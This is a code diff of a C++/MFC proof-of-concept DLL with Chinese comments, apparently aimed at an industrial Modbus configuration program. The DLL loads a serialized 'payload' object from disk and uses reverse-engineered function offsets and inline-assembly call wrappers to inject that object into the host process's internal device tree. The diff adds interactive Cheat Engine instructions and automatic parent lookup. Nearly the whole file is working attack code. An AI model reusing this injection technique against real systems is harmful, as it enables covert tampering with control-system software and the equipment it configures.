@@ -1,106 +1,36 @@
-// #include <afx.h>
-// #include <afxwin.h>
-
-// class CModbusSlave : public CObject {
-// public:
-//     virtual void Serialize(CArchive& ar);
-//     static CRuntimeClass* PASCAL GetThisClass();
-// };
-
-// extern "C" __declspec(dllexport) void RunPoc() {
-//     AFX_MANAGE_STATE(AfxGetStaticModuleState());
-
-//     // 1. 读取 Payload
-//     CFile fLoad;
-//     CFileException e;
-//     if (!fLoad.Open(_T("C:\\payload.bin"), CFile::modeRead | CFile::typeBinary, &e)) {
-//         ::MessageBox(NULL, _T("Payload not found"), 0, 0);
-//         return;
-//     }
-
-//     HMODULE hLogic = GetModuleHandle(_T("dllDPLogic.dll"));
-//     if (!hLogic) return;
-//     typedef CRuntimeClass* (*FnGetClass)();
-//     FnGetClass pfnGetClass = (FnGetClass)GetProcAddress(hLogic, "?GetThisClass@CModbusSlave@@SGPAUCRuntimeClass@@XZ");
-//     if (!pfnGetClass) return;
-
-//     CObject* pObj = pfnGetClass()->CreateObject();
-
-//     // 2. Load (反序列化)
-//     CArchive arLoad(&fLoad, CArchive::load);
-//     try {
-//         pObj->Serialize(arLoad);
-//     }
-//     catch(...) {
-//         ::MessageBox(NULL, _T("Load Failed!"), _T("Error"), MB_OK);
-//         delete pObj;
-//         return;
-//     }
-//     arLoad.Close();
-//     fLoad.Close();
-
-//     // 3. Round-Trip Store (再次序列化到新文件)
-//     CFile fStore;
-//     if (fStore.Open(_T("C:\\roundtrip.bin"), CFile::modeCreate | CFile::modeWrite | CFile::typeBinary)) {
-//         CArchive arStore(&fStore, CArchive::store);
-//         try {
-//             pObj->Serialize(arStore);
-//             ::MessageBox(NULL, _T("Round-Trip Success!\nCheck C:\\roundtrip.bin"), _T("Victory"), MB_OK);
-//         }
-//         catch(...) {
-//             ::MessageBox(NULL, _T("Round-Trip Store Failed"), _T("Error"), MB_OK);
-//         }
-//         arStore.Close();
-//         fStore.Close();
-//     }
-
-//     delete pObj;
-// }
-
+#define _CRT_SECURE_NO_WARNINGS
 #include <afx.h>
 #include <afxwin.h>
+#include <iostream>
+#include <iomanip>
 
 // ==========================================================================
-// CONFIGURATION ZONE
+// ⚙️ 偏移量配置 (基于 IDA 基址 10000000)
 // ==========================================================================
-// 🔴 必填：在 Cheat Engine 中搜到的 CHWDataContainer 对象地址
-static void* TARGET_CONTAINER_ADDR = (void*)0x12BA1278; 
-
-// 函数偏移 (基于 IDA 基址 10000000)
-static const uintptr_t OFFSET_GetNewID = 0x471A0;
-static const uintptr_t OFFSET_Register = 0x1CF00;
-static const uintptr_t OFFSET_Notify   = 0x4A380;
-static const uintptr_t OFFSET_Link     = 0x51AA0;
-
-// 关键 this 指针偏移 (基于你的汇编截图确凿证据)
-static const uintptr_t THIS_OFFSET_REGISTER = 0x08;   // "add ecx, 8"
-static const uintptr_t THIS_OFFSET_NOTIFY   = 0x36C;  // "lea ecx, [esi+36Ch]"
-static const uintptr_t THIS_OFFSET_LINK_P2C = 0x3A4;  // "lea ecx, [esi+3A4h]" (父->子)
-static const uintptr_t THIS_OFFSET_LINK_C2P = 0x3C0;  // "lea ecx, [esi+3C0h]" (子->父)
-
-// 假设父节点 ID 为 1 (Hardware Root)
-static const int PARENT_ID = 1;
-
 const TCHAR* PAYLOAD_PATH = _T("C:\\payload.bin");
 
+static const uintptr_t OFFSET_SafeLookup = 0xB4F0;
+static const uintptr_t OFFSET_GetNewID   = 0x471A0;
+static const uintptr_t OFFSET_Register   = 0x1CF00;
+static const uintptr_t OFFSET_Notify     = 0x4A380;
+static const uintptr_t OFFSET_Link       = 0x51AA0;
+
+static const uintptr_t THIS_OFFSET_REGISTER = 0x08;
+static const uintptr_t THIS_OFFSET_NOTIFY   = 0x36C;
+static const uintptr_t THIS_OFFSET_LINK_C2P = 0x3C0;
+static const uintptr_t THIS_OFFSET_LINK_P2C = 0x3A4;
+
 // ==========================================================================
-// CORE LOGIC
+// 🔧 汇编包装器 (已展开为标准多行格式，修复 C2601/C1075 错误)
 // ==========================================================================
 
-class CModbusSlave : public CObject {
-public:
-    virtual void Serialize(CArchive& ar);
-    static CRuntimeClass* PASCAL GetThisClass();
-};
-
-// Wrappers
 __declspec(naked) void ASM_Call_GetNewID(void* fn, void* pThis, void* pSlave) {
     __asm {
         push ebp
         mov ebp, esp
-        mov ecx, [ebp+12]
-        push [ebp+16]
-        call [ebp+8]
+        mov ecx, [ebp+12]   // pThis
+        push [ebp+16]       // pSlave
+        call [ebp+8]        // fn
         pop ebp
         ret
     }
@@ -110,9 +40,9 @@ __declspec(naked) void** ASM_Call_Register(void* fn, void* pThis, int id) {
     __asm {
         push ebp
         mov ebp, esp
-        mov ecx, [ebp+12]
-        push [ebp+16]
-        call [ebp+8]
+        mov ecx, [ebp+12]   // pThis
+        push [ebp+16]       // id
+        call [ebp+8]        // fn
         pop ebp
         ret
     }
@@ -122,9 +52,9 @@ __declspec(naked) void ASM_Call_Notify(void* fn, void* pThis, int* pIdPtr) {
     __asm {
         push ebp
         mov ebp, esp
-        mov ecx, [ebp+12]
-        push [ebp+16]
-        call [ebp+8]
+        mov ecx, [ebp+12]   // pThis
+        push [ebp+16]       // pIdPtr
+        call [ebp+8]        // fn
         pop ebp
         ret
     }
@@ -134,34 +64,106 @@ __declspec(naked) int* ASM_Call_Link(void* fn, void* pThis, int id) {
     __asm {
         push ebp
         mov ebp, esp
-        mov ecx, [ebp+12]
-        push [ebp+16]
-        call [ebp+8]
+        mov ecx, [ebp+12]   // pThis
+        push [ebp+16]       // id
+        call [ebp+8]        // fn
         pop ebp
         ret
     }
 }
 
+class CModbusSlave : public CObject {
+public:
+    virtual void Serialize(CArchive& ar);
+    static CRuntimeClass* PASCAL GetThisClass();
+};
+
+// ==========================================================================
+// 🛠️ 辅助功能：打印 VTable
+// ==========================================================================
+void PrintSlaveVTable(HMODULE hLogic) {
+    typedef CRuntimeClass* (*Fn)();
+    Fn GetClass = (Fn)GetProcAddress(hLogic, "?GetThisClass@CModbusSlave@@SGPAUCRuntimeClass@@XZ");
+    if (!GetClass) {
+        std::cout << "[-] Error: Cannot find CModbusSlave factory." << std::endl;
+        return;
+    }
+    
+    CObject* p = GetClass()->CreateObject();
+    unsigned int vtbl = *(unsigned int*)p;
+    
+    std::cout << "\n------------------------------------------------\n";
+    std::cout << " [STEP 1] Find Existing Slave ID\n";
+    std::cout << "------------------------------------------------\n";
+    std::cout << "Target VTable (Hex): " << std::hex << std::uppercase << vtbl << std::dec << "\n";
+    std::cout << "Action:\n";
+    std::cout << "  1. Search this HEX value in Cheat Engine (4 Bytes).\n";
+    std::cout << "  2. Pick any result address (NOT static/green ones).\n";
+    std::cout << "  3. Look at offset +24 (0x18). That number is the ID.\n";
+    
+    delete p;
+}
+
+// ==========================================================================
+// 🚀 主流程
+// ==========================================================================
 extern "C" __declspec(dllexport) void RunPoc() {
     AFX_MANAGE_STATE(AfxGetStaticModuleState());
-
-    void* pContainer = TARGET_CONTAINER_ADDR;
-    if (IsBadReadPtr(pContainer, 4)) {
-        ::MessageBox(NULL, _T("Address Invalid"), 0, 0); return;
-    }
+    
+    AllocConsole();
+    freopen("CONIN$", "r", stdin);
+    freopen("CONOUT$", "w", stdout);
+    freopen("CONOUT$", "w", stderr);
 
     HMODULE hLogic = GetModuleHandle(_T("dllDPLogic.dll"));
+    if (!hLogic) { std::cout << "[-] DLL not loaded." << std::endl; return; }
     DWORD_PTR base = (DWORD_PTR)hLogic;
 
-    void* fnGetNewID = (void*)(base + OFFSET_GetNewID);
-    void* fnRegister = (void*)(base + OFFSET_Register);
-    void* fnNotify   = (void*)(base + OFFSET_Notify);
-    void* fnLink     = (void*)(base + OFFSET_Link);
+    // 1. 打印 VTable 供你查找 Slave ID
+    PrintSlaveVTable(hLogic);
 
-    // Load Payload
+    // 2. 等待输入
+    uintptr_t addrInput = 0;
+    int slaveID = 0;
+
+    std::cout << "\n------------------------------------------------\n";
+    std::cout << " [STEP 2] Input Data\n";
+    std::cout << "------------------------------------------------\n";
+    std::cout << "Enter Container Address (Hex) [Your 143004E0]: ";
+    std::cin >> std::hex >> addrInput;
+    
+    std::cout << "Enter Existing Slave ID (Dec) [Found in CE]: ";
+    std::cin >> std::dec >> slaveID;
+
+    void* pContainer = (void*)addrInput;
+    if (IsBadReadPtr(pContainer, 4)) {
+        std::cout << "[-] Invalid Container Address." << std::endl; return;
+    }
+
+    // 3. 自动反查 Parent (侦探逻辑)
+    std::cout << "\n------------------------------------------------\n";
+    std::cout << " [STEP 3] Detect Parent & Inject\n";
+    std::cout << "------------------------------------------------\n";
+    
+    int parentID = 0;
+    void* fnLink = (void*)(base + OFFSET_Link);
+    void* pLinkC2P = (char*)pContainer + THIS_OFFSET_LINK_C2P;
+
+    try {
+        int* pResult = ASM_Call_Link(fnLink, pLinkC2P, slaveID);
+        if (pResult && !IsBadReadPtr(pResult, 4)) {
+            parentID = *pResult;
+            std::cout << "[+] Found Parent ID: " << parentID << std::endl;
+        } else {
+            std::cout << "[-] Failed to find Parent ID. Is Slave ID correct?" << std::endl;
+            return;
+        }
+    } catch(...) { std::cout << "[-] Crash in detection." << std::endl; return; }
+
+    // 4. 加载 Payload 并 注入
     CFile f;
     if (!f.Open(PAYLOAD_PATH, CFile::modeRead | CFile::typeBinary)) {
-        ::MessageBox(NULL, _T("Payload missing"), 0, 0); return;
+        std::cout << "[-] Payload not found." << std::endl; return;
     }
     ULONGLONG len = f.GetLength();
     BYTE* buf = new BYTE[(size_t)len];
@@ -176,37 +178,37 @@ extern "C" __declspec(dllexport) void RunPoc() {
     try { pSlave->Serialize(ar); } catch(...) { delete pSlave; delete[] buf; return; }
     ar.Close(); delete[] buf;
 
-    // Injection Sequence
+    // 准备注入函数
+    void* fnGetNewID = (void*)(base + OFFSET_GetNewID);
+    void* fnRegister = (void*)(base + OFFSET_Register);
+    void* fnNotify   = (void*)(base + OFFSET_Notify);
+
     try {
-        // 1. Allocate ID
+        // A. Get ID
         ASM_Call_GetNewID(fnGetNewID, pContainer, pSlave);
         int new_id = *((int*)((char*)pSlave + 24));
+        std::cout << "-> Allocated New ID: " << new_id << std::endl;
 
-        // 2. Register (Map[id] = Object)
-        void* pRegThis = (char*)pContainer + THIS_OFFSET_REGISTER; // +8
+        // B. Register
+        void* pRegThis = (char*)pContainer + THIS_OFFSET_REGISTER;
         void** pSlot = ASM_Call_Register(fnRegister, pRegThis, new_id);
         if (pSlot) *pSlot = pSlave;
 
-        // 3. Link: Child -> Parent (关键！UI 树向上查找父节点)
-        // 汇编证据: lea ecx, [esi+3C0h]
-        void* pLinkC2P = (char*)pContainer + THIS_OFFSET_LINK_C2P; // +0x3C0
-        int* pSlotC2P = ASM_Call_Link(fnLink, pLinkC2P, new_id);
-        if (pSlotC2P) *pSlotC2P = PARENT_ID; 
-
-        // 4. Link: Parent -> Child (反向查找，有的逻辑需要)
-        // 汇编证据: lea ecx, [esi+3A4h]
-        // 注意：这里参数 Key 是 ParentID，Value 是 ChildID
-        void* pLinkP2C = (char*)pContainer + THIS_OFFSET_LINK_P2C; // +0x3A4
-        int* pSlotP2C = ASM_Call_Link(fnLink, pLinkP2C, PARENT_ID);
+        // C. Link (双向)
+        void* pLinkP2C = (char*)pContainer + THIS_OFFSET_LINK_P2C; // +3A4
+        int* pSlotP2C = ASM_Call_Link(fnLink, pLinkP2C, parentID);
         if (pSlotP2C) *pSlotP2C = new_id;
 
-        // 5. Notify UI
-        void* pNotifyThis = (char*)pContainer + THIS_OFFSET_NOTIFY; // +0x36C
+        int* pSlotC2P = ASM_Call_Link(fnLink, pLinkC2P, new_id);
+        if (pSlotC2P) *pSlotC2P = parentID;
+
+        // D. Notify
+        void* pNotifyThis = (char*)pContainer + THIS_OFFSET_NOTIFY;
         ASM_Call_Notify(fnNotify, pNotifyThis, &new_id);
 
-        ::MessageBox(NULL, _T("✅ INJECTION DONE!\nCheck Tree View."), _T("Victory"), MB_OK);
+        std::cout << "\n[+] SUCCESS! Tree View Updated." << std::endl;
     }
     catch (...) {
-        ::MessageBox(NULL, _T("Crash in Logic"), _T("Error"), MB_OK);
+        std::cout << "[-] Injection Crashed." << std::endl;
     }
 }
